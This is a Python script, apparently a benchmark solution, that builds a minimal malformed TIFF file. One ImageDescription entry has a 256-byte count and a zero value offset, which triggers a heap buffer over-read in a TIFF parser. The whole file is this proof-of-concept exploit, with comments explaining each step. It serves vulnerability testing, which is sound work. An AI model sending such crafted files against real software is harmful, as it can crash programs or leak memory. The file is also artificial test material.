import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Heap Buffer Overflow caused by invalid offline tags 
        with a value offset of zero.
        
        We construct a minimal TIFF file (Little Endian) with:
        - A valid header
        - One IFD entry
        - The entry has a large count (making it an "offline" tag, size > 4 bytes)
        - The entry has an offset of 0 (pointing to the start of the file)
        
        When the parser attempts to read the tag value from offset 0 with the specified
        large size, it will read past the end of the small file buffer, triggering
        a heap buffer overflow (read) or potentially bad logic with the header data.
        """
        # TIFF Header: 
        # Byte Order: "II" (0x4949, Little Endian)
        # Magic: 42 (0x002A)
        # Offset to first IFD: 8
        header = struct.pack('<2sH I', b'II', 42, 8)
        
        # IFD Structure:
        # Number of Directory Entries: 1
        num_entries = struct.pack('<H', 1)
        
        # Directory Entry 1:
        # Tag: 0x010E (ImageDescription) - A common metadata tag
        # Type: 2 (ASCII) - 1 byte per component
        # Count: 256 - Size is 256 bytes. Since 256 > 4, this is an "offline" tag.
        # Offset: 0 - The malicious offset pointing to start of file.
        #
        # Note: We use a count of 256 which implies a read size of 256 bytes.
        # The total file size will be 26 bytes.
        # Reading 256 bytes from offset 0 will overrun the buffer.
        entry = struct.pack('<HHII', 0x010E, 2, 256, 0)
        
        # Offset to next IFD: 0 (None)
        next_ifd = struct.pack('<I', 0)
        
        return header + num_entries + entry + next_ifd